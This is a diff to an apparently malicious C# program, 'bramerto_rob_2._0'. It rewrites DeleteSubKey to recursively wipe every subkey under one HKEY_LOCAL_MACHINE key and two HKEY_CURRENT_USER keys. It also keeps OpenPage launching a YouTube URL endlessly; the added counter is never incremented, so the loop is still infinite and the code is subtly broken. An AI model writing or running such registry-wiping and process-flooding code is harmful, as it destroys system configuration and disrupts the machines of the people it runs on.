@@ -145,15 +145,31 @@ namespace bramerto_rob_2._0
                 key.SetValue("value", "1");
         }
 
-        public void DeleteSubKey(string subkey)
+        public void DeleteSubKey(string subkey, string subkey2, string subkey3)
         {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(subkey);
-            key.DeleteSubKey(subkey);
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(subkey, true))
+            {
+                string[] subkeys = key.GetSubKeyNames();
+                foreach (string delkey in subkeys) { key.DeleteSubKeyTree(delkey, true); }
+            }
+
+            using (RegistryKey key2 = Registry.CurrentUser.OpenSubKey(subkey2, true))
+            {
+                string[] subkeys2 = key2.GetSubKeyNames();
+                foreach (string delkey2 in subkeys2) { key2.DeleteSubKeyTree(delkey2, true); }
+            }
+
+            using (RegistryKey key3 = Registry.CurrentUser.OpenSubKey(subkey3, true))
+            {
+                 string[] subkeys3 = key3.GetSubKeyNames();
+                 foreach (string delkey3 in subkeys3) { key3.DeleteSubKeyTree(delkey3, true); }
+            }
         }
 
         public void OpenPage()
         {
-            while (true)
+            int cost = 0;
+            while (cost < 1000)
             {
                 Process.Start("https://www.youtube.com/watch?v=QDCPKBF7a1Q");
             }
